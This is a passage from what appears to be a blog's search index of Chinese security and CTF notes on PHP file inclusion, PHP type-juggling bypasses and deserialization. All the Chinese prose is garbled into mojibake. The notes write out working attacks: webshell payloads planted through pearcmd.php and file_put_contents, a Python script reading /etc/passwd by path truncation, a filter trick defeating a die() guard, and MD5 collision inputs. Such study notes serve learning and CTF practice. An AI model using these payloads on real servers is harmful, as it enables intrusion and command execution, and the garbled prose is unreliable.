çš„å‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œå¦‚æœæœåŠ¡å™¨å­˜åœ¨ æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ï¼Œå¯ä»¥é€šè¿‡åŒ…å« pearcmd.php å¹¶ä¼ å‚æ¥æ‰§è¡Œä»»æ„ PHP ä»£ç ï¼Œä»è€Œå®ç° è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ pearcmd.php å¯èƒ½çš„è·¯å¾„ Linux /usr/share/php/pearcmd.php/usr/local/lib/php/pearcmd.php/var/www/html/pear/pearcmd.php Windowsï¼ˆXAMPPï¼‰ C:\\xampp\\php\\PEAR\\pearcmd.php åˆ©ç”¨ ç›´æ¥åŒ…å« pearcmd.php è¿›è¡Œ RCE å¦‚æœæœåŠ¡å™¨æœ‰ LFI æ¼æ´ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼š http://target.com/index.php?file=/usr/share/php/pearcmd.php ç„¶åä½¿ç”¨ +config-create+ å†™å…¥ Webshellï¼š http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-create+/var/www/html+?=system($_GET[cmd]);?+.php è¿™å°†åœ¨ /var/www/html/.php ç”Ÿæˆ Webshellï¼Œç„¶åè®¿é—®ï¼š http://target.com/.php?cmd=id å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ç»“åˆ php://input è¿›è¡Œä»£ç æ‰§è¡Œ å¦‚æœæœåŠ¡å™¨ allow_url_include=Onï¼Œå¯ä»¥ï¼š http://target.com/index.php?file=php://input ç„¶åç”¨ POST å‘é€ï¼š ?php system(id); ? å¦‚æœ pearcmd.php å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ï¼š http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-show è¿™æ · pearcmd.php å¯èƒ½ä¼šè§£æ session æˆ– ä¸´æ—¶æ–‡ä»¶ï¼Œæ‰§è¡Œæ¶æ„ä»£ç  ç»“åˆ session.auto_start è¿›è¡Œä»£ç æ‰§è¡Œ å¦‚æœ session.auto_start=1ï¼Œå¯ä»¥å°†æ¶æ„ä»£ç å†™å…¥ $_SESSIONï¼Œç„¶åé€šè¿‡ pearcmd.php è§£æï¼š ?phpsession_start();$_SESSION[payload] = ?php system(id); ?;? ç„¶åè®¿é—®ï¼š http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-show å¯èƒ½ä¼šè§£æ $_SESSION å¹¶æ‰§è¡Œ payload ä»£ç  ç»•è¿‡å§¿åŠ¿ æŒ‡å®šå‰ç¼€ ç›®å½•éå† ../å¯ä»¥è¿›è¡Œç›®å½•éå† ç¼–ç ç»•è¿‡ æœ‰æ—¶æŠŠç‚¹å·è¿‡æ»¤äº†ï¼Œå°è¯•ç¼–ç ç‚¹å· æŒ‡å®šåç¼€ URL URLæ ¼å¼åœ¨æ­¤å¤„å…·æœ‰å¦™ç”¨ï¼Œå¯ä»¥åœ¨payloadæœ€ååŠ **?æˆ–è€…#ï¼ˆurlç¼–ç ä¸º%23ï¼‰ï¼Œæˆ–è€…ç©ºæ ¼ç»•è¿‡%20** ä½¿ç”¨åè®® phar://å’Œzip://éƒ½å¯ä»¥ é•¿åº¦æˆªæ–­ åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬ php 5.2.8 ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œåœ¨windowä¸‹æ˜¯256å­—èŠ‚ã€‚åªè¦ä¸æ–­çš„é‡å¤./ åˆ™åç¼€/test/test.phpï¼Œåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰ import requests# ç›®æ ‡ URLurl = http://target.com/index.php?file=# ç›®æ ‡æ–‡ä»¶payload = ../../../../../../etc/passwd# ç”Ÿæˆè¶…é•¿è·¯å¾„ï¼ˆè¶…è¿‡æœåŠ¡å™¨é™åˆ¶ï¼‰long_truncation = payload + A * 4000 # è®©è·¯å¾„è¶…é•¿# å‘é€è¯·æ±‚response = requests.get(url + long_truncation)# æ£€æŸ¥æ˜¯å¦æˆåŠŸif root: in response.text: print([+] æˆåŠŸç»•è¿‡ï¼Œå·²è¯»å– /etc/passwd) print(response.text)else: print([-] å¤±è´¥ï¼Œå¯èƒ½éœ€è¦è°ƒæ•´é•¿åº¦) /etc/passwd æ–‡ä»¶åŒ…å« root: å…³é”®å­—ï¼Œå¦‚æœè¿”å› root:x:0:0: è¯´æ˜è¯»å–æˆåŠŸ 0å­—èŠ‚æˆªæ–­ åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬ php 5.3.4 index.php?file=phpinfo.txt%00 æŒ‡å®šå‰åç¼€ ?php $file = $_GET[file]; include /var/www/html/.$file./test/test.php;? å¯ä»¥ä½¿ç”¨ç›®å½•éå†å’Œé•¿åº¦æˆªæ–­ï¼ˆæˆ–è€…0å­—èŠ‚æˆªæ–­ï¼‰ï¼Œæœ‰å¿…è¦çš„è¯å¯ä»¥å¯¹ç‚¹å·ç¼–ç ï¼Œè‡³å°‘åè®®å’ŒURLä½¿ç”¨ä¸äº† é˜²å¾¡æ–¹æ¡ˆ åœ¨å¾ˆå¤šåœºæ™¯ä¸­éƒ½éœ€è¦å»åŒ…å«webç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¦‚æœphpé…ç½®äº†open_basedirï¼Œåˆ™ä¼šåŒ…å«å¤±è´¥ open_basedir çš„ä¸»è¦ä½œç”¨æ˜¯é™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šçš„ç›®å½•åŠå…¶å­ç›®å½•ã€‚è¿™æ ·ï¼Œå³ä½¿æŸä¸ªè„šæœ¬å­˜åœ¨æ¼æ´ï¼Œä¹Ÿæ— æ³•è®¿é—®è¶…å‡ºè¿™äº›é™å®šç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ åšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç† å¯¹å±é™©å­—ç¬¦è¿›è¡Œè¿‡æ»¤ç­‰ç­‰","tags":["æ¼æ´","PHP","æ–‡ä»¶åŒ…å«"],"categories":["PHP","æ¼æ´"]},{"title":"PHPç‰¹æ€§æ€»ç»“","path":"/2025/07/09/PHPç‰¹æ€§æ€»ç»“/","content":"PHPç‰¹æ€§æ€»ç»“ æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ if(preg_match(/[0-9]/, $num)) die(no no no!);else(intval($num)) echo $flag; preg_match(/[0-9]/, $num) ä½œç”¨ï¼šæ£€æŸ¥ $num æ˜¯å¦åŒ…å« æ•°å­— 0-9 å¦‚æœåŒ…å«ï¼Œå°± die(no no no!); ç»ˆæ­¢ç¨‹åº å¦‚æœä¸åŒ…å«ï¼Œæ‰§è¡Œ elseif (intval($num)) intval($num) ä½œç”¨ï¼šå°è¯•å°† $num è½¬æ¢ä¸ºæ•´æ•° å¦‚æœè½¬æ¢ç»“æœä¸ºçœŸï¼ˆé 0ï¼‰ï¼Œå°±è¾“å‡º $flag å¦‚æœè½¬æ¢ç»“æœä¸º 0ï¼Œåˆ™ä¸è¾“å‡º $flag preg_matchç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™ä¸ä¼šè¿›å…¥ifè¯­å¥ payload: num[]=1 [!IMPORTANT] num[]=1ç»•è¿‡åŸç†åˆ†æ ç»•è¿‡ preg_match() å½“ä½ ä¼ é€’ num[]=1 ä½œä¸ºå‚æ•°æ—¶ï¼Œ$num å˜æˆäº†ä¸€ä¸ªåŒ…å«å•ä¸ªå…ƒç´ çš„æ•°ç»„ï¼šarray(1)ã€‚ preg_match(/[0-9]/, $num) è¯•å›¾åœ¨æ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­—ï¼Œç„¶è€Œ preg_match() åªæ¥å—å­—ç¬¦ä¸²ç±»å‹ä½œä¸ºå‚æ•°ï¼Œå› æ­¤å®ƒä¼šè§¦å‘ä¸€ä¸ªè­¦å‘Šå¹¶è¿”å› falseã€‚ç”±äºè­¦å‘Šä¸ä¼šé˜»æ­¢ä»£ç ç»§ç»­æ‰§è¡Œï¼Œpreg_match() ä¸ä¼šæˆåŠŸåŒ¹é…æ•°å­—ï¼Œå¯¼è‡´ä»£ç ç»§ç»­è¿›å…¥ elseif åˆ†æ”¯ã€‚ è§¦å‘ intval($num) å¯¹äº intval($num)ï¼Œå¦‚æœ $num æ˜¯ä¸€ä¸ª éç©ºæ•°ç»„ï¼ˆæ¯”å¦‚ array(1)ï¼‰ï¼ŒPHP ä¼šå°†å…¶è½¬åŒ–ä¸º 1ï¼Œå› æ­¤æ¡ä»¶ intval($num) ä¼šæˆç«‹ï¼Œè¿›å…¥ elseif åˆ†æ”¯å¹¶è§¦å‘ echo $flagã€‚ intvalå‡½æ•°çš„ä½¿ç”¨ if($num===4476) die(no no no!);if(intval($num,0)===4476) echo $flag;else echo intval($num,0); intval( mixed $value, int $base = 10) : int å½“ base å‚æ•°çš„å€¼ä¸º 0 æ—¶ï¼Œintval() ä¼šæ ¹æ®è¾“å…¥å­—ç¬¦ä¸²çš„ å‰ç¼€ è‡ªåŠ¨æ¨æ–­è¿›åˆ¶ å¦‚æœå­—ç¬¦ä¸²ä»¥ 0x æˆ– 0X å¼€å¤´ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²ä¼šè¢«è§†ä¸º åå…­è¿›åˆ¶ æ•°å­— å¦‚æœå­—ç¬¦ä¸²ä»¥ 0 å¼€å¤´ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²ä¼šè¢«è§†ä¸º å…«è¿›åˆ¶ æ•°å­— å…¶ä»–æƒ…å†µï¼Œåˆ™ä¼šå°†è¯¥å­—ç¬¦ä¸²è§†ä¸º åè¿›åˆ¶ æ•°å­— ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ intval(4476.0)===4476 å°æ•°ç‚¹intval(+4476.0)===4476 æ­£è´Ÿå·intval(4476e0)===4476 ç§‘å­¦è®¡æ•°æ³•intval(0x117c)===4476 16è¿›åˆ¶intval(010574)===4476 8è¿›åˆ¶intval( 010574)===4476 8è¿›åˆ¶+ç©ºæ ¼ payload: num=4476.0 æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦ if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; iï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼šæ„å‘³ç€ phpã€PHPã€PhP éƒ½èƒ½åŒ¹é…ã€‚ mï¼ˆå¤šè¡Œæ¨¡å¼ï¼‰ï¼š ^ ä»£è¡¨ æ¯ä¸€è¡Œ çš„å¼€å¤´ï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´ã€‚ $ ä»£è¡¨ æ¯ä¸€è¡Œ çš„ç»“å°¾ï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„ç»“å°¾ã€‚ å¦‚æœ $a æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ /^php$/imï¼ˆä¸åŒºåˆ†å¤§å°å†™ä¸”æ”¯æŒå¤šè¡ŒåŒ¹é…ï¼‰ï¼Œå°±è¿›å…¥å†…éƒ¨çš„åˆ¤æ–­ã€‚ å¦‚æœ $a ä»…ç­‰äº phpï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œåˆ™è¾“å‡º hackerã€‚ å¦‚æœ $a æ»¡è¶³ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†ä¸å®Œå…¨ç­‰äº phpï¼Œåˆ™è¾“å‡º $flagã€‚ å¦‚æœ $a æ²¡æœ‰åŒ¹é…ç¬¬ä¸€ä¸ªæ¡ä»¶ /^php$/imï¼Œåˆ™è¾“å‡º nononononoã€‚ payload: %0aphp æˆ– php%0aphp highlight_fileè·¯å¾„ if($_GET[u]==flag.php) die(no no no);else highlight_file($_GET[u]); ifè¯­å¥åªæ¯”å¯¹å­—ç¬¦ä¸²ï¼Œhighlight_fileå¯ä»¥å†™è·¯å¾„ï¼Œæ•…payloadæœ‰å¤šç§è§£æ³•ï¼š ?u=php://filter/read=convert.base64-encode/resource=flag.php phpä¼ªåè®®?u=/var/www/html/flag.php ç»å¯¹è·¯å¾„?u=./flag.php ç›¸å¯¹è·¯å¾„ md5æ¯”è¾ƒç¼ºé™· if ($_POST[a] != $_POST[b]) if (md5($_POST[a]) === md5($_POST[b])) echo $flag; else print Wrong.; æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸¤ä¸ª ä¸ç›¸ç­‰çš„å€¼ï¼Œä½†å®ƒä»¬çš„ md5() è®¡ç®—ç»“æœç›¸åŒï¼Œå³ MD5 ç¢°æ’ md5å¼±æ¯”è¾ƒ ä¸åŒæ•°æ®å¼ºç›¸ç­‰ï¼ˆ===ï¼‰ æœªä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬åŒ– MD5æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™è¿”å›NULLï¼Œä¸¤ä¸ªNULLæ˜¯å¼ºç›¸ç­‰çš„ payload: a[]=1b[]=2 ä¸åŒæ•°æ®å¼±ç›¸ç­‰ï¼ˆ==ï¼‰ payload: a=QNKCDZOb=240610708 ç§‘å­¦è®°æ•°æ³•ç»•è¿‡ 0e å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢« PHP è¯†åˆ«ä¸º ç§‘å­¦è®°æ•°æ³•ï¼Œå¹¶è½¬æ¢ä¸ºæ•°å­— 0ï¼Œåªéœ€æ‰¾ä¸¤ä¸ªmd5åéƒ½ä¸º0eå¼€å¤´ä¸”0e åé¢å‡ä¸ºæ•°å­—çš„å€¼å³å¯ payloadï¼ša=0e215962017b=0e0 md5å¼ºç¢°æ’ $a = (string)$a;$b = (string)$b;if( ($a !== $b) (md5($a) === md5($b)) ) echo $flag; è¿™é‡Œçš„æ¡ä»¶è¦æ±‚ $a å’Œ $b å¿…é¡» ä¸ç›¸ç­‰ï¼Œä½†å®ƒä»¬çš„ MD5 å“ˆå¸Œå€¼ç›¸åŒ a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 sha1æ¯”è¾ƒç¼ºé™· if($a==$b) if(sha1($a)==sha1($b)) echo $flag; sha1æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚ä¸Šå¯ä½¿ç”¨a[]=1b[]=1æ•°ç»„ç»•è¿‡ å¦‚æœå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œåˆ™ä¸æ¥å—æ•°ç»„ï¼Œæ‰¾çœŸæ­£çš„ç¼–ç åç›¸åŒçš„ aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£+å˜é‡è¦†ç›– $_GET?$_GET=$_POST:flag;$_GET[flag]==flag?$_GET=$_COOKIE:flag;$_GET[flag]==flag?$_GET=$_SERVER:flag;highlight_file($_GET[HTTP_FLAG]==flag?$flag:__FILE__); $_GET ? $_GET = $_POST : flag; æœ $_GET æ•°ç»„ä¸ä¸ºç©ºï¼Œåˆ™å°† $_GET çš„å¼•ç”¨èµ‹å€¼ç»™ $_POSTå³$_GET å’Œ $_POST ä¼šæŒ‡å‘ç›¸åŒçš„æ•°æ® $_GET[flag] == flag ? $_GET = $_COOKIE : flag; å¦‚æœ $_GET['flag'] çš„å€¼ä¸º 'flag'ï¼Œåˆ™å°† $_GET æ•°ç»„çš„å¼•ç”¨èµ‹å€¼ç»™ $_COOKIEå³$_GET å’Œ $_COOKIE å°†æŒ‡å‘ç›¸åŒçš„æ•°æ® $_GET[flag] == flag ? $_GET = $_SERVER : flag; å¦‚æœ $_GET['flag'] çš„å€¼ä¸º 'flag'ï¼Œåˆ™å°† $_GET æ•°ç»„çš„å¼•ç”¨èµ‹å€¼ç»™ $_SERVERã€‚è¿™ä½¿å¾— $_GET å’Œ $_SERVER æŒ‡å‘ç›¸åŒçš„æ•°æ® highlight_file($_GET[HTTP_FLAG] == flag ? $flag : __FILE__); è¯¥è¡Œä¼šé«˜äº®æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ¡ä»¶æ˜¯ $_GET['HTTP_FLAG'] ç­‰äº 'flag'ã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œå®ƒä¼šæ˜¾ç¤º $flag å˜é‡çš„å†…å®¹ï¼›å¦åˆ™ï¼Œå®ƒä¼šæ˜¾ç¤ºå½“å‰è„šæœ¬æ–‡ä»¶çš„å†…å®¹ payload:GET è¯·æ±‚: 1=1POST è¯·æ±‚: HTTP_FLAG=flag phpå¼±ç±»å‹æ¯”è¾ƒ $allow = array();for ($i=36; $i 0x36d; $i++) array_push($allow, rand(1,$i));if(isset($_GET[n]) in_array($_GET[n], $allow)) file_put_contents($_GET[n], $_POST[content]); payload:GET è¯·æ±‚: ?n=1.php //1å¯æ›¿æ¢æˆå…¶ä»–æ•°å­—è¿›è¡Œå°è¯•POST è¯·æ±‚: content=?php system($_GET[cmd]); ? å¦‚ï¼š å‡è®¾æˆ‘ä»¬æ‰¾åˆ°äº†åˆæ³•çš„ $_GET['n']=123ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼  Webshellï¼š POST /vuln.php?n=123 HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedcontent=?php system($_GET[cmd]); ? ç„¶åè®¿é—®ï¼š http://target.com/123?cmd=whoami andä¸çš„åŒºåˆ« $a = false true;$b = false and true;var_dump($a); // è¾“å‡º: falsevar_dump($b); // è¾“å‡º: true false true å…ˆè®¡ç®— false trueï¼ˆç»“æœæ˜¯ falseï¼‰ï¼Œç„¶åèµ‹å€¼ç»™ $aã€‚ false and true å…ˆæ‰§è¡Œ $b = falseï¼Œç„¶å true æ²¡æœ‰å½±å“ã€‚ PHPåŒï¼ˆï¼ˆï¼ˆ$ï¼‰çš„å˜é‡è¦†ç›– åœ¨åŒå†™$çš„æ—¶å€™ï¼Œå±äºåŠ¨æ€å˜é‡ï¼Œå°±æ˜¯åé¢çš„å˜é‡å€¼ä½œä¸ºæ–°çš„å˜é‡å $test=a23; $testç­‰äºa23$$test=456; $$testä¹Ÿå°±ç­‰äº$a23,è¿™é‡Œç›¸å½“äºç»™$a23èµ‹å€¼äº†echo $test; æ­£å¸¸è¾“å‡º$testä¸ºa23echo $$test; è¿™é‡Œè¾“å‡º$$testï¼Œå°±æ˜¯$a23ï¼Œä¸º456 parse_strå‡½æ•°çš„ä½¿ç”¨ parse_strä¼šæŠŠå­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¼ å…¥çš„å¤šä¸ªå€¼ $a=q=123p=456;parse_str($a);echo $q; è¾“å‡º123echo $p; è¾“å‡º456parse_str($a,$b); ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæ•°ç»„ï¼Œè§£æçš„å˜é‡éƒ½å­˜å…¥è¿™ä¸ªæ•°ç»„ä¸­echo $b[q]; è¾“å‡º123echo $b[p]; è¾“å‡º456 trimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡ trim() å‡½æ•°ç”¨äºå»é™¤å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰ trimé»˜è®¤æ—¶æ²¡æœ‰å‰”é™¤%0cï¼ˆæ¢é¡µç¬¦ï¼‰ if(is_numeric($num) and $num!==36 and trim($num)!==36) if($num==36) echo $flag; else echo hacker!!; payload: num=%0c36 ç»•è¿‡æ­»äº¡die function filter($x) if(preg_match(/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i,$ x)) die(too young too simple sometimes naive!); $file=$_GET[file];$contents=$_POST[contents];filter($file);file_put_contents($file, ?php die();?.$contents); payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phppost:contents=?hp pvela$(P_SO[T]1;)? è¿™ä¼šå°†å­—ç¬¦ä¸¤ä½ä¸¤ä½äº¤æ¢ï¼Œfile_put_contentsåœ¨å†™å…¥çš„æ—¶å€™ä¼šç ´åé‚£å¥dieï¼Œä½†contentsé‚£å¥æ¢å¤åŸè²Œï¼Œ å¯ä»¥æ‰§è¡Œ gettextæ‹“å±•çš„ä½¿ç”¨ var_dump(call_user_func($f1,$f2)); å¦‚ä»¥ä¸Šä»£ç ï¼Œå¤šé‡è¿‡æ»¤åï¼Œf1å¯ä»¥ä¸º gettext ï¼Œf2å¯ä»¥ä¸º phpinfo ï¼Œå¦‚æœè¿‡æ»¤æ›´ä¸ºä¸¥æ ¼ï¼Œæ›´æ”¹iniæ–‡ä»¶é‡Œ çš„æ‹“å±•åï¼Œ _() ç­‰æ•ˆäº gettext() ?phpecho gettext(phpinfo);ç»“æœ phpinfoecho _(phpinfo);ç»“æœ phpinfo phpç‰¹æ€§æ€»ç»“","tags":["æ¼æ´","PHP"],"categories":["PHP","æ¼æ´"]},{"title":"PHPååºåˆ—åŒ–","path":"/2025/07/09/PHPååºåˆ—åŒ–/","content":"PHPååºåˆ—åŒ– åºåˆ—åŒ–å’Œååºåˆ—åŒ– åºåˆ—åŒ– åˆ©ç”¨serialize()å‡½æ•°å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼ åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²çš„æ ¼å¼ æ¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å°æ®µéƒ½ç”±; éš”å¼€, ä½¿ç”¨è¡¨ç¤ºå±‚çº§å…³ç³» æ•°æ®ç±»å‹ æç¤ºç¬¦ æ ¼å¼ å­—ç¬¦ä¸² s s:é•¿åº¦:â€œå†…å®¹â€ å·²è½¬ä¹‰å­—ç¬¦ä¸² S s:é•¿åº¦:â€œè½¬ä¹‰åçš„å†…å®¹â€ æ•´æ•° i i:æ•°å€¼ å¸ƒå°”å€¼ b b:1 = true / b:0 = false ç©ºå€¼ N N; æ•°ç»„ a a:å¤§å°:{é”®åºåˆ—æ®µ;å€¼åºåˆ—æ®µ;é‡å¤å¤šæ¬¡} å¯¹è±¡/ç±» O O:ç±»å‹åé•¿åº¦:â€œç±»å‹åç§°â€:æˆå‘˜æ•°:{æˆå‘˜åç§°åºåˆ—æ®µ;æˆå‘˜å€¼åºåˆ—æ®µ:} å¼•ç”¨ R R:ååºåˆ—åŒ–å˜é‡çš„åºå·, ä»1å¼€å§‹ å…³äºéå…¬æœ‰å­—æ®µåç§°: privateï¼šç”¨ç§æœ‰çš„ç±»çš„åç§° (è€ƒè™‘åˆ°ç»§æ‰¿çš„æƒ…å†µ) å’Œå­—æ®µåç»„åˆ %00ç±»å%00æˆå‘˜åï¼ˆ%00å ä¸€ä¸ªå­—èŠ‚é•¿åº¦ï¼‰ protectedï¼šç”¨ * å’Œå­—æ®µåç»„åˆ %00*%00æˆå‘˜å æ³¨ï¼šæ³¨æ„è¿™ä¸¤ä¸ª%00å°±æ˜¯ ascii ç ä¸º0 çš„å­—ç¬¦ï¼Œä¸ºä¸å¯è§å­—ç¬¦ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹è§ã€‚æˆ‘ä»¬å¯ä»¥å°†åºåˆ—åŒ–çš„å­—ç¬¦ç”¨urlencodeç¼–ç ä¹‹å,æ‰“å°å‡ºæ¥æŸ¥çœ‹ ç¤ºä¾‹ å¦‚æœæ˜¯ç›´æ¥è¾“å‡ºå¯¹è±¡ï¼š ?php class test public $name=ikkunma; public $age=18; $a=new test(); print_r($a);? è¾“å‡ºï¼š test Object ( [name] = ikkunma [age] = 18 ) å¦‚æœåˆ©ç”¨serialize()å‡½æ•°å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆå­—ç¬¦ä¸²ç„¶åè¾“å‡ºï¼š ?php class test public $name=ikkunma; private $age=18; protected $sex=man; $a=new test(); $a=serialize($a); print_r($a);? è¾“å‡ºï¼š O:4:test:3:s:4:name;s:7:ikkunma;s:9:testage;s:2:18;s:6:*sex;s:3:man; O è¡¨ç¤ºå¯¹è±¡ 4 è¯´æ˜å¯¹è±¡åé•¿åº¦æ˜¯4ä¸ªå­—ç¬¦ test è¯´æ˜è¿™ä¸ªå¯¹è±¡åæ˜¯test 3 è¯´æ˜è¿™ä¸ªå¯¹è±¡æˆå‘˜ä¸ªæ•°ä¸º3 ä¸ª ... åŒ…å«å¯¹è±¡çš„æ‰€æœ‰å±æ€§ ååºåˆ—åŒ– åˆ©ç”¨unserailize()å‡½æ•°å°†ä¸€ä¸ªç»è¿‡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸæˆphpä»£ç å½¢å¼ ?php $b=åºåˆ—åŒ–å­—ç¬¦ä¸²; $b=unserialize($b);? ä½œç”¨ åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èˆ¬ç”¨åšç¼“å­˜ï¼Œæ¯”å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ PHPååºåˆ—åŒ–æ¼æ´åŸç† CTF é‡Œå¸¸è€ƒçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé‡ç‚¹å°±æ˜¯æ‰¾åˆé€‚çš„ç±»ï¼Œåˆ©ç”¨é­”æœ¯æ–¹æ³•è§¦å‘æ¼æ´ PHPå¸¸è§é­”æœ¯æ–¹æ³• è¯¦ç»†è®²è§£é­”æœ¯æ–¹æ³•çš„ç”¨æ³• __construct æ„é€ å‡½æ•°,ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³• __destruct ææ„å‡½æ•°,ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚ __wakeup() ä½¿ç”¨unserializeæ—¶è§¦å‘ __sleep() ä½¿ç”¨serializeæ—¶è§¦å‘ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ __call() åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ __callStatic() ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() åœ¨ç»™ä¸å¯è®¿é—®çš„(protectedæˆ–è€…private)æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼çš„æ—¶å€™ï¼Œä¼šè¢«è°ƒç”¨ __isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString() æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸² __invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œè¯¥å¯¹è±¡å¿…é¡»æ˜¯ç›´æ¥æ‹¥æœ‰__invoke()é­”æœ¯æ–¹æ³•çš„å¯¹è±¡ æˆ‘è¿™è¾¹åªè®²5ä¸ªé­”æœ¯æ–¹æ³•ï¼š 